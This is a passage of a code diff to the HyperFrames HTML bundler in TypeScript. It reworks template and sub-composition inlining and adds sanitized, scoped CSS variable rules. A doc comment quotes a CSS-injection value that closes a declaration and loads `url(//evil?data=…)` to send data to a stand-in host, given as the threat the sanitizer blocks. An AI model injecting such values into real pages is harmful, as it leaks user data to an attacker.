+      const extScript = document.createElement("script");
+      extScript.setAttribute("src", extSrc);
+      document.body.appendChild(extScript);
     }
-    for (const s of [...contentDoc.querySelectorAll("script")]) {
-      const externalSrc = (s.getAttribute("src") || "").trim();
-      if (externalSrc) {
-        // External CDN/remote script — collect for deduped injection into the document.
-        // Do NOT try to inline the content (external scripts have no innerHTML).
-        if (!compExternalScriptSrcs.includes(externalSrc)) {
-          compExternalScriptSrcs.push(externalSrc);
-        }
-      } else {
-        compScriptChunks.push(
-          scopeCompId
-            ? wrapScopedCompositionScript(
-                s.textContent || "",
-                scopeCompId,
-                "[HyperFrames] composition script error:",
-                runtimeScope,
-                runtimeCompId || scopeCompId,
-              )
-            : `(function(){ try { ${s.textContent || ""} } catch (_err) { console.error('[HyperFrames] composition script error:', _err); } })();`,
-        );
-      }
-      s.remove();
-    }
-
-    // Rewrite relative asset paths before inlining so ../foo.svg from
-    // compositions/ resolves correctly when the content moves to root.
-    const assetEls = innerRoot
-      ? innerRoot.querySelectorAll("[src], [href]")
-      : contentDoc.querySelectorAll("[src], [href]");
-    rewriteAssetPaths(
-      assetEls,
-      src,
-      (el: Element, attr: string) => el.getAttribute(attr),
-      (el: Element, attr: string, val: string) => {
-        el.setAttribute(attr, val);
-      },
-    );
-    const styledEls = innerRoot
-      ? innerRoot.querySelectorAll("[style]")
-      : contentDoc.querySelectorAll("[style]");
-    rewriteInlineStyleAssetUrls(
-      styledEls,
-      src,
-      (el: Element) => el.getAttribute("style"),
-      (el: Element, val: string) => {
-        el.setAttribute("style", val);
-      },
-    );
-
-    if (innerRoot) {
-      const innerW = innerRoot.getAttribute("data-width");
-      const innerH = innerRoot.getAttribute("data-height");
-      if (innerW && !hostEl.getAttribute("data-width")) hostEl.setAttribute("data-width", innerW);
-      if (innerH && !hostEl.getAttribute("data-height")) hostEl.setAttribute("data-height", innerH);
-      innerRoot.setAttribute("data-composition-file", src);
-      for (const child of [...innerRoot.querySelectorAll("style, script")]) child.remove();
-      hostEl.innerHTML = compId ? innerRoot.innerHTML || "" : innerRoot.outerHTML || "";
-    } else {
-      for (const child of [...contentDoc.querySelectorAll("style, script")]) child.remove();
-      hostEl.innerHTML = contentDoc.body.innerHTML || "";
-    }
-    hostEl.setAttribute("data-composition-file", src);
-    hostEl.removeAttribute("data-composition-src");
   }
 
   // Inline template compositions: inject <template id="X-template"> content into
   // matching empty host elements with data-composition-id="X" (no data-composition-src)
+  const candidateInlineHosts = trackedCompositionHosts.filter(
+    (host) => !host.hasAttribute("data-composition-src"),
+  );
   for (const templateEl of [...document.querySelectorAll("template[id]")]) {
     const templateId = templateEl.getAttribute("id") || "";
     const match = templateId.match(/^(.+)-template$/);
     if (!match) continue;
     const compId = match[1];
+    if (!compId) continue;
 
-    // Find the matching host element (must have data-composition-id, no data-composition-src,
-    // and must NOT be inside a <template> element).
-    const hostSelector = `[data-composition-id="${compId}"]:not([data-composition-src])`;
-    // linkedom follows the DOM spec: querySelectorAll does not reach inside <template>
-    // content, so no isInsideTemplate filter is needed.
-    const host = document.querySelector(hostSelector);
-    if (!host) continue;
-    if (host.children.length > 0) continue; // already has content
+    const hosts = candidateInlineHosts.filter(
+      (host) =>
+        hostIdentityByElement.get(host)?.authoredCompositionId === compId &&
+        host.children.length === 0,
+    );
+    if (hosts.length === 0) continue;
 
-    // Get template content and inject into host
     const templateHtml = templateEl.innerHTML || "";
-    const innerDoc = parseHTMLContent(templateHtml);
-    const innerRoot = innerDoc.querySelector(`[data-composition-id="${compId}"]`);
 
-    if (innerRoot) {
-      // Hoist styles into the collected style chunks
-      for (const styleEl of [...innerRoot.querySelectorAll("style")]) {
-        const css = styleEl.textContent || "";
-        compStyleChunks.push(compId ? scopeCssToComposition(css, compId) : css);
-        styleEl.remove();
+    for (const host of hosts) {
+      const hostIdentity = hostIdentityByElement.get(host);
+      const runtimeCompId = hostIdentity?.runtimeCompositionId || compId;
+      const innerDoc = parseHTMLContent(templateHtml);
+      const innerRoot = queryByAttr(innerDoc, "data-composition-id", compId);
+      const authoredRootId = innerRoot?.getAttribute("id")?.trim() || null;
+      const runtimeScope = runtimeCompId
+        ? cssAttributeSelector("data-composition-id", runtimeCompId)
+        : "";
+      const mergedVariables = runtimeCompId ? parseHostVariableValues(host) : {};
+      if (runtimeCompId && Object.keys(mergedVariables).length > 0) {
+        compVariablesByComp[runtimeCompId] = mergedVariables;
       }
-      // Hoist scripts into the collected script chunks
-      for (const scriptEl of [...innerRoot.querySelectorAll("script")]) {
-        const externalSrc = (scriptEl.getAttribute("src") || "").trim();
-        if (externalSrc) {
-          if (!compExternalScriptSrcs.includes(externalSrc)) {
-            compExternalScriptSrcs.push(externalSrc);
-          }
-        } else {
-          compScriptChunks.push(
+      // Same defect on the <template> mount as on the data-composition-src
+      // mount (see inlineSubCompositions): the merged instance values are
+      // baked in here, so only compile time can see a value that falls back.
+      if (runtimeCompId) {
+        warnUnknownEnumValues(innerDoc.documentElement, mergedVariables, runtimeCompId);
+        warnUnknownEnumValues(innerRoot, mergedVariables, runtimeCompId);
+      }
+      pushSubCompVariableStyles(
+        innerDoc,
+        innerRoot,
+        mergedVariables,
+        runtimeScope,
+        compStyleChunks,
+      );
+
+      if (innerRoot) {
+        // Hoist styles into the collected style chunks
+        for (const styleEl of [...innerRoot.querySelectorAll("style")]) {
+          const css = styleEl.textContent || "";
+          compStyleChunks.push(
             compId
-              ? wrapScopedCompositionScript(
-                  scriptEl.textContent || "",
-                  compId,
-                  "[HyperFrames] composition script error:",
-                )
-              : `(function(){ try { ${scriptEl.textContent || ""} } catch (_err) { console.error('[HyperFrames] composition script error:', _err); } })();`,
+              ? scopeCssToComposition(css, compId, runtimeScope, authoredRootId, {
+                  scopeRootSelectors: true,
+                })
+              : css,
           );
+          styleEl.remove();
         }
-        scriptEl.remove();
-      }
+        hoistCompositionScripts(innerRoot, {
+          projectDir,
+          document,
+          compId,
+          runtimeScope,
+          runtimeCompId,
+          authoredRootId: authoredRootId ?? undefined,
+          seenCompScriptSrcs,
+          compScriptChunks,
+        });
 
-      // Copy dimension attributes from inner root to host if not already set
-      const innerW = innerRoot.getAttribute("data-width");
-      const innerH = innerRoot.getAttribute("data-height");
-      if (innerW && !host.getAttribute("data-width")) host.setAttribute("data-width", innerW);
-      if (innerH && !host.getAttribute("data-height")) host.setAttribute("data-height", innerH);
-
-      host.innerHTML = innerRoot.innerHTML || "";
-    } else {
-      // No matching inner root — inject all template content directly
-      for (const styleEl of [...innerDoc.querySelectorAll("style")]) {
-        const css = styleEl.textContent || "";
-        compStyleChunks.push(compId ? scopeCssToComposition(css, compId) : css);
-        styleEl.remove();
-      }
-      for (const scriptEl of [...innerDoc.querySelectorAll("script")]) {
-        const externalSrc = (scriptEl.getAttribute("src") || "").trim();
-        if (externalSrc) {
-          if (!compExternalScriptSrcs.includes(externalSrc)) {
-            compExternalScriptSrcs.push(externalSrc);
-          }
-        } else {
-          compScriptChunks.push(
+        // Copy dimension attributes from inner root to host if not already set
+        const innerW = innerRoot.getAttribute("data-width");
+        const innerH = innerRoot.getAttribute("data-height");
+        if (innerW && !host.getAttribute("data-width")) host.setAttribute("data-width", innerW);
+        if (innerH && !host.getAttribute("data-height")) host.setAttribute("data-height", innerH);
+        const preparedInnerRoot = prepareFlattenedInnerRoot(innerRoot);
+        host.innerHTML = preparedInnerRoot.outerHTML || "";
+      } else {
+        // No matching inner root — inject all template content directly
+        for (const styleEl of [...innerDoc.querySelectorAll("style")]) {
+          const css = styleEl.textContent || "";
+          compStyleChunks.push(
             compId
-              ? wrapScopedCompositionScript(
-                  scriptEl.textContent || "",
-                  compId,
-                  "[HyperFrames] composition script error:",
-                )
-              : `(function(){ try { ${scriptEl.textContent || ""} } catch (_err) { console.error('[HyperFrames] composition script error:', _err); } })();`,
+              ? scopeCssToComposition(css, compId, runtimeScope, undefined, {
+                  scopeRootSelectors: true,
+                })
+              : css,
           );
+          styleEl.remove();
         }
-        scriptEl.remove();
+        hoistCompositionScripts(innerDoc, {
+          projectDir,
+          document,
+          compId,
+          runtimeScope,
+          runtimeCompId,
+          authoredRootId: undefined,
+          seenCompScriptSrcs,
+          compScriptChunks,
+        });
+
+        host.innerHTML = innerDoc.body.innerHTML || "";
       }
-      host.innerHTML = innerDoc.body.innerHTML || "";
     }
 
     // Remove the template element from the document
@@ -680,11 +1070,14 @@ export async function bundleToSingleHtml(
 
   // Inject external scripts from sub-compositions (e.g., Lottie CDN)
   // that aren't already present in the main document.
-  for (const extSrc of compExternalScriptSrcs) {
-    if (!document.querySelector(`script[src="${extSrc}"]`)) {
-      const extScript = document.createElement("script");
-      extScript.setAttribute("src", extSrc);
-      document.body.appendChild(extScript);
+  for (const link of compExternalLinks) {
+    const escapedHref = link.href.replace(/\\/g, "\\\\").replace(/"/g, '\\"');
+    if (!document.querySelector(`link[href="${escapedHref}"]`)) {
+      const linkEl = document.createElement("link");
+      linkEl.setAttribute("rel", link.rel);
+      linkEl.setAttribute("href", link.href);
+      if (link.crossorigin != null) linkEl.setAttribute("crossorigin", link.crossorigin);
+      document.head.appendChild(linkEl);
     }
   }
 
@@ -693,21 +1086,33 @@ export async function bundleToSingleHtml(
     style.textContent = compStyleChunks.join("\n\n");
     document.head.appendChild(style);
   }
+  const variablesByCompScript = buildVariablesByCompScript(compVariablesByComp);
+  if (variablesByCompScript) {
+    compScriptChunks.unshift(variablesByCompScript);
+  }
   if (compScriptChunks.length) {
     const compScript = document.createElement("script");
     compScript.textContent = joinJsChunks(compScriptChunks);
     document.body.appendChild(compScript);
   }
 
+  emitRootCompositionVariableStyles(document, compVariablesByComp);
+
   enforceCompositionPixelSizing(document);
   autoHealMissingCompositionIds(document);
   coalesceHeadStylesAndBodyScripts(document);
+  injectTextRenderingRule(document);
 
   // Inline textual assets
   for (const el of [...document.querySelectorAll("[src], [href], [poster], [xlink\\:href]")]) {
     for (const attr of ["src", "href", "poster", "xlink:href"] as const) {
       const value = el.getAttribute(attr);
       if (!value) continue;
+      // Chromium requires external SVG <use> fragments to be same-origin with
+      // the document. Converting the sprite to a data: URL makes it an opaque
+      // origin and triggers "Unsafe attempt to load URL ... from frame".
+      // Keep the project-relative URL; render/check servers already expose it.
+      if (isExternalSvgFragmentUse(el, attr, value)) continue;
       const inlined = maybeInlineRelativeAssetUrl(value, projectDir);
       if (inlined) el.setAttribute(attr, inlined);
     }
@@ -725,6 +1130,220 @@ export async function bundleToSingleHtml(
       rewriteCssUrlsWithInlinedAssets(el.getAttribute("style") || "", projectDir),
     );
   }
+  if (options?.inlineColorGradingLuts !== false) {
+    for (const el of [...document.querySelectorAll(`[${HF_COLOR_GRADING_ATTR}]`)]) {
+      const value = el.getAttribute(HF_COLOR_GRADING_ATTR);
+      if (value) {
+        el.setAttribute(
+          HF_COLOR_GRADING_ATTR,
+          rewriteColorGradingLutWithInlinedAssets(value, projectDir),
+        );
+      }
+    }
+  }
 
   return document.toString();
+}
+
+/**
+ * Make a scalar variable value safe to bake into a stylesheet.
+ *
+ * Two independent hazards, so two layers:
+ *
+ * 1. `sanitizeCssValue` is the runtime's own contract (`applyVariableBindings`,
+ *    and `docs/concepts/variables.mdx` promises it): a scalar folded into
+ *    `background: var(--x)` must not be able to close the declaration and open a
+ *    new rule (`red; } body { background-image: url(//evil?data=…) }`). The
+ *    compile path has to reach the same result as the runtime — a value the
+ *    runtime strips but a compile-time emit honours would make the rendered MP4
+ *    diverge from the preview.
+ * 2. These rules are then serialized inside a `<style>` element, which is a RAW
+ *    TEXT element: HTML serialization does not escape its content and the
+ *    tokenizer ends it at the first `</style`. `\3c ` is the CSS escape for `<`,
+ *    valid in every value position including inside an unquoted `url()`, and
+ *    resolves back to `<`, so rendering is unchanged. The trailing space is
+ *    consumed as part of the escape.
+ *
+ * The sanitizer already removes `<`, so today layer 2 is redundant for values
+ * and load-bearing only for the selector (`cssAttributeSelector`, which must
+ * preserve `<` to keep matching). It stays because the two layers answer to
+ * different rules: narrowing the scalar character set must not silently reopen
+ * an element-termination hole.
+ *
+ * Variable IDs need no equivalent: `cssVariableName` slugifies them.
+ */
+function cssSafeVariableValue(value: string | number): string {
+  return sanitizeCssValue(String(value)).replace(/</g, "\\3c ");
+}
+
+/** One stylesheet rule defining primitive composition variables under `selector`. */
+function compositionVariablesCssBlock(
+  variables: Record<string, unknown>,
+  selector: string,
+): string | null {
+  const lines: string[] = [];
+  for (const [id, value] of Object.entries(variables)) {
+    if ((typeof value === "string" && value !== "") || typeof value === "number") {
+      lines.push(`  ${cssVariableName(id)}: ${cssSafeVariableValue(value)};`);
+    }
+  }
+  if (lines.length === 0) return null;
+  return `${selector} {\n${lines.join("\n")}\n}`;
+}
+
+/**
+ * Compile-time counterpart of the runtime's injectCompositionCssVariables:
+ * every element declaring data-composition-variables gets a scoped stylesheet
+ * rule so var(--slug, literal) references resolve during body parse. The
+ * runtime injection remains define-if-absent, so it won't double-apply.
+ *
+ * `variablesByComp` (host-merged sub-composition values, keyed by runtime
+ * composition id) adds one rule per scope — the flattened inner root loses
+ * its data-composition-id, so the host selector is the only stable anchor.
+ * Exported for the producer's render compiler, which inlines sub-compositions
+ * through the shared module rather than this bundler.
+ * Returns whether a style element was appended.
+ */
+export function emitRootCompositionVariableStyles(
+  document: Document,
+  variablesByComp: Record<string, Record<string, unknown>> = {},
+  overrides: Record<string, unknown> = {},
+): boolean {
+  const authoredDefines = authoredDefinesPredicate(document);
+  const layerFor = makeVariableLayer(authoredDefines, overrides);
+  const rules = [
+    ...hostScopedVariableRules(variablesByComp, overrides, authoredDefines),
+    ...rootDeclaredVariableRules(document, layerFor),
+    ...declarerVariableRules(document, layerFor),
+  ];
+  if (rules.length === 0) return false;
+  const style = document.createElement("style");
+  style.setAttribute("data-hf-composition-variables", "");
+  style.textContent = rules.join("\n\n");
+  document.head.appendChild(style);
+  return true;
+}
+
+type VariableLayer = (
+  declared: Record<string, unknown>,
+  hostValues: Record<string, unknown>,
+) => Record<string, unknown>;
+
+function authoredDefinesPredicate(document: Document): (id: string) => boolean {
+  const authoredCss = [...document.querySelectorAll("style:not([data-hf-composition-variables])")]
+    .map((s) => s.textContent || "")
+    .join("\n");
+  return (id) => new RegExp(`${cssVariableName(id)}\\s*:`).test(authoredCss);
+}
+
+/**
+ * Layering for one declarer: authored stylesheet definitions win over
+ * declared defaults (the runtime's define-if-absent, applied statically) —
+ * a var already defined in any authored <style> block is not emitted. Host
+ * values and --variables overrides are explicit intent, never filtered.
+ */
+function makeVariableLayer(
+  authoredDefines: (id: string) => boolean,
+  overrides: Record<string, unknown>,
+): VariableLayer {
+  return (declared, hostValues) => {
+    const out: Record<string, unknown> = {};
+    for (const [id, value] of Object.entries(declared)) {
+      if (!authoredDefines(id)) out[id] = value;
+    }
+    for (const [id, value] of Object.entries(hostValues)) {
+      if (id in declared) out[id] = value;
+    }
+    for (const [id, value] of Object.entries(overrides)) {
+      if (id in declared || id in hostValues) out[id] = value;
+    }
+    return out;
+  };
+}
+
+/**
+ * Host-scoped rules: per-instance values inherited by the host's subtree.
+ * A composition variable, whether a declared default or an explicit
+ * data-variable-values value, never redefines a custom property authored by
+ * another part of the document. Render-time --variables overrides remain
+ * explicit user intent and always win.
+ */
+function hostScopedVariableRules(
+  variablesByComp: Record<string, Record<string, unknown>>,
+  overrides: Record<string, unknown>,
+  authoredDefines: (id: string) => boolean,
+): string[] {
+  const rules: string[] = [];
+  for (const [compId, vars] of Object.entries(variablesByComp)) {
+    const withOverrides: Record<string, unknown> = {};
+    for (const [id, value] of Object.entries(vars)) {
+      if (!authoredDefines(id)) withOverrides[id] = value;
+    }
+    for (const [id, value] of Object.entries(overrides)) {
+      if (id in vars) withOverrides[id] = value;
+    }
+    const rule = compositionVariablesCssBlock(
+      withOverrides,
+      cssAttributeSelector("data-composition-id", compId),
+    );
+    if (rule) rules.push(rule);
+  }
+  return rules;
+}
+
+function rootDeclaredVariableRules(document: Document, layerFor: VariableLayer): string[] {
+  const htmlDeclared = readDeclaredDefaults(document.documentElement);
+  const htmlRule = compositionVariablesCssBlock(layerFor(htmlDeclared, {}), ":root");
+  return htmlRule ? [htmlRule] : [];
+}
+
+/**
+ * Declarer rules anchor on a per-instance marker attribute, not the
+ * composition id: two inlined instances of one sub-composition share a
+ * data-composition-id, and a shared selector would let instance A's rule
+ * restyle instance B. The nearest ancestor host's data-variable-values
+ * layer over the declared defaults (mirrors the runtime loader).
+ */
+function declarerVariableRules(document: Document, layerFor: VariableLayer): string[] {
+  const rules: string[] = [];
+  let markerSeq = 0;
+  for (const el of [...document.querySelectorAll("[data-composition-variables]")]) {
+    const declared = readDeclaredDefaults(el);
+    const hostEl =
+      typeof el.closest === "function" ? el.parentElement?.closest("[data-variable-values]") : null;
+    const hostValues = hostEl ? parseHostVariableValues(hostEl) : {};
+    const vars = layerFor(declared, hostValues);
+    if (Object.keys(vars).length === 0) continue;
+    markerSeq += 1;
+    el.setAttribute("data-hf-var-scope", String(markerSeq));
+    const rule = compositionVariablesCssBlock(vars, `[data-hf-var-scope="${markerSeq}"]`);
+    if (rule) rules.push(rule);
+  }
+  return rules;
+}
+
+/**
+ * Compile-time CSS custom properties for a sub-comp scope: declared defaults
+ * layered under per-instance host values, emitted as a stylesheet rule on the
+ * host selector. A stylesheet in <head> is in effect while the body parses,
+ * so eval-time reads (GSAP .from immediateRender, canvas tinting) see the
+ * right values — the runtime's DOMContentLoaded injection is too late for
+ * those on compiled pages.
+ */
+function pushSubCompVariableStyles(
+  innerDoc: Document,
+  innerRoot: Element | null,
+  mergedVariables: Record<string, unknown>,
+  runtimeScope: string,
+  compStyleChunks: string[],
+): void {
+  if (!runtimeScope) return;
+  const declaredForCss = readDeclaredDefaults(innerDoc.documentElement);
+  const innerRootForVars = innerRoot ?? innerDoc.querySelector("[data-composition-variables]");
+  if (innerRootForVars) Object.assign(declaredForCss, readDeclaredDefaults(innerRootForVars));
+  const cssVars = compositionVariablesCssBlock(
+    { ...declaredForCss, ...mergedVariables },
+    runtimeScope,
+  );
+  if (cssVars) compStyleChunks.push(cssVars);
 }
